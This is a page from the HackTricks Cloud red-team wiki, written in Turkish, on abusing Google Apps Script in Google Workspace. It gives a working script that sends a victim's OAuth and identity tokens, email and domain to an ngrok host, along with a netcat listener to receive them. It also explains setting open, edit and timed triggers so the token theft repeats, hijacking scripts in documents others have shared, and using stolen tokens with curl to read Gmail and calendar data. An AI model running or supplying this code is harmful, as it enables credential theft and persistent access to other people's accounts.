# GWS - App Scripts

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## App Scripts

App Scripts, **App Script'in bağlı olduğu belgeye erişen bir editör iznine sahip kullanıcı tarafından tetiklenecek kodlardır** ve **OAuth istemini kabul ettikten sonra** çalıştırılır.\
Ayrıca, App Script'in sahibi tarafından **belirli bir zaman diliminde çalıştırılacak şekilde ayarlanabilir** (Süreklilik).

### App Script Oluşturma

App Script oluşturmanın birkaç yolu vardır, en yaygın olanları **herhangi bir türdeki Google Belgesi'nden** ve **bağımsız bir proje olarak** oluşturmaktır:

<details>

<summary>Google Docs, Sheets veya Slides'dan bir konteyner bağlı proje oluşturun</summary>

1. Bir Docs belgesi, bir Sheets elektronik tablosu veya Slides sunumu açın.
2. **Eklentiler** > **Google Apps Script**'e tıklayın.
3. Script editöründe, **Başlıksız proje**'ye tıklayın.
4. Projenize bir isim verin ve **Yeniden Adlandır**'a tıklayın.

</details>

<details>

<summary>Bağımsız bir proje oluşturun</summary>

Apps Script'ten bağımsız bir proje oluşturmak için:

1. [`script.google.com`](https://script.google.com/) adresine gidin.
2. **Yeni Proje** ekleyin.
3. Script editöründe, **Başlıksız proje**'ye tıklayın.
4. Projenize bir isim verin ve **Yeniden Adlandır**'a tıklayın.

</details>

<details>

<summary>Google Drive'dan bağımsız bir proje oluşturun</summary>

1. [Google Drive](https://drive.google.com/) açın.
2. **Yeni** > **Daha Fazla** > **Google Apps Script**'e tıklayın.

</details>

<details>

<summary>Google Forms'dan bir konteyner bağlı proje oluşturun</summary>

1. Google Forms'da bir form açın.
2. Daha Fazla more\_vert > **Script editörü**'ne tıklayın.
3. Script editöründe, **Başlıksız proje**'ye tıklayın.
4. Projenize bir isim verin ve **Yeniden Adlandır**'a tıklayın.

</details>

<details>

<summary>clasp komut satırı aracını kullanarak bağımsız bir proje oluşturun</summary>

`clasp`, terminalden Apps Script projeleri oluşturmanıza, çekmenize/itmenize ve dağıtmanıza olanak tanıyan bir komut satırı aracıdır.

Daha fazla ayrıntı için [Command Line Interface using `clasp` guide](https://developers.google.com/apps-script/guides/clasp) sayfasına bakın.

</details>

## App Script Senaryosu <a href="#create-using-clasp" id="create-using-clasp"></a>

### App Script ile Google Sheet Oluşturma

Bir App Script oluşturarak başlayın, bu senaryo için önerim bir Google Sheet oluşturmak ve **`Eklentiler > App Scripts`**'e gitmektir, bu sizin için **sayfaya bağlı yeni bir App Script açacaktır**.

### Token sızıntısı

OAuth token'ına erişim vermek için **`Hizmetler +`'a tıklayıp** aşağıdaki gibi kapsamlar eklemeniz gerekir:

* **AdminDirectory**: Dizinin kullanıcılarına ve gruplarına erişim (kullanıcının yeterli izinleri varsa)
* **Gmail**: Gmail verilerine erişim
* **Drive**: Drive verilerine erişim
* **Google Sheets API**: Tetikleyici ile çalışması için

Gerekli **kapsamları** kendiniz değiştirmek için proje ayarlarına gidip **`appsscript.json` manifest dosyasını editörde göster** seçeneğini etkinleştirebilirsiniz.

{% code overflow="wrap" %}
```javascript
function getToken() {
var userEmail = Session.getActiveUser().getEmail();
var domain = userEmail.substring(userEmail.lastIndexOf("@") + 1);
var oauthToken = ScriptApp.getOAuthToken();
var identityToken = ScriptApp.getIdentityToken();

// Data json
data = {
"oauthToken": oauthToken,
"identityToken": identityToken,
"email": userEmail,
"domain": domain
}

// Send data
makePostRequest(data);

// Use the APIs, if you don't even if the have configured them in appscript.json the App script won't ask for permissions

// To ask for AdminDirectory permissions
var pageToken = "";
page = AdminDirectory.Users.list({
domain: domain,  // Use the extracted domain
orderBy: 'givenName',
maxResults: 100,
pageToken: pageToken
});

// To ask for gmail permissions
var threads = GmailApp.getInboxThreads(0, 10);

// To ask for drive permissions
var files = DriveApp.getFiles();
}


function makePostRequest(data) {
var url = 'http://5.tcp.eu.ngrok.io:12027';

var options = {
'method' : 'post',
'contentType': 'application/json',
'payload' : JSON.stringify(data)
};

try {
UrlFetchApp.fetch(url, options);
} catch (e) {
Logger.log("Error making POST request: " + e.toString());
}
}
```
{% endcode %}

İsteği yakalamak için sadece şunu çalıştırabilirsiniz:
```bash
ngrok tcp 4444
nc -lv 4444 #macOS
```
Permissions requested to execute the App Script:

<figure><img src="../../../.gitbook/assets/image (334).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
Dış bir istek yapıldığında OAuth istemi ayrıca **dış uç noktalarına erişim izni istemektedir**.
{% endhint %}

### Trigger Oluşturma

Uygulama okunduktan sonra, bir tetikleyici oluşturmak için **⏰ Tetikleyiciler** üzerine tıklayın. **Fonksiyon** olarak **`getToken`** seçin, dağıtımda **`Head`** olarak çalışır, olay kaynağında **`From spreadsheet`** seçin ve olay türü olarak **`On open`** veya **`On edit`** (ihtiyacınıza göre) seçin ve kaydedin.

Bir şeyi hata ayıklamak isterseniz, **Uygulama Scriptlerinin çalıştırmalarını Çalıştırmalar sekmesinde** kontrol edebileceğinizi unutmayın.

### Paylaşım

**App Script**'i **tetiklemek** için kurbanın **Düzenleyici Erişimi** ile bağlanması gerekir.

{% hint style="success" %}
**App Script**'i çalıştırmak için kullanılan **token**, **tetikleyicinin yaratıcısının** token'ı olacaktır, dosya diğer kullanıcılar tarafından Düzenleyici olarak açılsa bile.
{% endhint %}

### Benimle Paylaşılan Belgeleri Kötüye Kullanma

{% hint style="danger" %}
Eğer biri **App Script ve tetikleyici ile bir belgeyi sizinle paylaştıysa ve App Script'in Head'ini kullanıyorsa** (sabit bir dağıtım değilse), App Script kodunu değiştirebilir (örneğin, çalma token fonksiyonları ekleyerek), erişebilir ve **App Script, belgeyi sizinle paylaşan kullanıcının izinleriyle çalıştırılacaktır**! (sahiplerin OAuth token'ı, tetikleyici oluşturulduğunda verilen erişim kapsamlarına sahip olacaktır).

**Bir bildirim, scriptin yaratıcısına birinin scripti değiştirdiğini belirten bir bildirim gönderilecektir** (uyarıyı önlemek için gmail izinlerini kullanmak ne olur?).
{% endhint %}

{% hint style="success" %}
Eğer bir **saldırgan App Script'in kapsamlarını değiştirirse**, güncellemeler **yeni bir tetikleyici** oluşturulmadıkça belgeye **uygulanmayacaktır**. Bu nedenle, bir saldırgan, oluşturduğu tetikleyicide ayarladığı kapsamdan daha fazla kapsamla sahiplerin yaratıcı token'ını çalamayacaktır.
{% endhint %}

### Paylaşmak Yerine Kopyalama

Bir belgeyi paylaşmak için bir bağlantı oluşturduğunuzda, buna benzer bir bağlantı oluşturulur: `https://docs.google.com/spreadsheets/d/1i5[...]aIUD/edit`\
Eğer **"/edit"** sonunu **"/copy"** ile **değiştirirseniz**, erişmek yerine google size **belgenin bir kopyasını oluşturmak isteyip istemediğinizi soracaktır:**

<figure><img src="../../../.gitbook/assets/image (335).png" alt=""><figcaption></figcaption></figure>

Kullanıcı bunu kopyalayıp erişirse, hem **belgenin içeriği hem de App Scriptler kopyalanacaktır**, ancak **tetikleyiciler kopyalanmaz**, bu nedenle **hiçbir şey çalıştırılmayacaktır**.

### Web Uygulaması Olarak Paylaşma

Bir **App Script'i Web uygulaması olarak paylaşmanın** da mümkün olduğunu unutmayın (App Script'in Düzenleyicisinde, Web uygulaması olarak dağıtın), ancak bu tür bir uyarı görünecektir:

<figure><img src="../../../.gitbook/assets/image (337).png" alt=""><figcaption></figcaption></figure>

Ardından gerekli izinleri isteyen **tipik OAuth istemi** gelecektir.

### Test Etme

Toplanan bir token'ı e-posta listelemek için test edebilirsiniz:

{% code overflow="wrap" %}
```bash
curl -X GET "https://www.googleapis.com/gmail/v1/users/<user@email>/messages" \
-H "Authorization: Bearer <token>"
```
{% endcode %}

Kullanıcının takvimini listele:
```bash
curl -H "Authorization: Bearer $OAUTH_TOKEN" \
-H "Accept: application/json" \
"https://www.googleapis.com/calendar/v3/users/me/calendarList"
```
## App Script olarak Süreklilik

Süreklilik için bir seçenek, **bir belge oluşturmak ve getToken** fonksiyonu için bir tetikleyici eklemek ve belgeyi saldırganla paylaşmaktır, böylece saldırgan dosyayı her açtığında **kurbanın token'ını dışarı aktarır.**

Ayrıca, bir App Script oluşturmak ve her X zamanda (her dakika, saat, gün gibi) tetiklenmesini sağlamak da mümkündür. **Kompromize olmuş kimlik bilgileri veya bir kurbanın oturumu olan bir saldırgan, her gün çok yetkili bir OAuth token'ını dışarı sızdırmak için bir App Script zaman tetikleyicisi ayarlayabilir**:

Sadece bir App Script oluşturun, Tetikleyiciler'e gidin, Tetikleyici Ekle'ye tıklayın ve olay kaynağı olarak Zaman odaklıyı seçin ve size en uygun seçenekleri seçin:

<figure><img src="../../../.gitbook/assets/image (336).png" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
Bu, bu konuda bir güvenlik uyarı e-postası ve mobil cihazınıza bir bildirim mesajı oluşturacaktır.
{% endhint %}

### Paylaşılan Belge Doğrulanmamış İstemci Atlatma

Ayrıca, eğer biri sizinle **düzenleyici erişimi** olan bir belge **paylaştıysa**, belgede **App Script'ler oluşturabilirsiniz** ve belgenin **SAHİBİ (yaratıcısı) App Script'in sahibi olacaktır**.

{% hint style="warning" %}
Bu, belgenin **yaratıcısının, içinde herhangi bir App Script oluşturan herkesin yaratıcısı olarak görüneceği** anlamına gelir.

Bu aynı zamanda, **App Script'in belgenin yaratıcısının Workspace ortamı tarafından güvenilir olacağı** anlamına gelir.
{% endhint %}

{% hint style="danger" %}
Bu aynı zamanda, eğer bir **App Script zaten mevcutsa** ve insanlar **erişim vermişse**, belgede **Düzenleyici** iznine sahip olan herkesin **onu değiştirebileceği ve bu erişimi kötüye kullanabileceği** anlamına gelir.\
Bunu kötüye kullanmak için ayrıca insanların App Script'i tetiklemesi gerekir. Ve harika bir hile, **script'i bir web uygulaması olarak yayınlamaktır**. **Erişim** vermiş olan **insanlar** web sayfasına eriştiğinde, **App Script'i tetikleyeceklerdir** (bu `<img>` etiketleri kullanarak da çalışır).
{% endhint %}

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**'i takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}
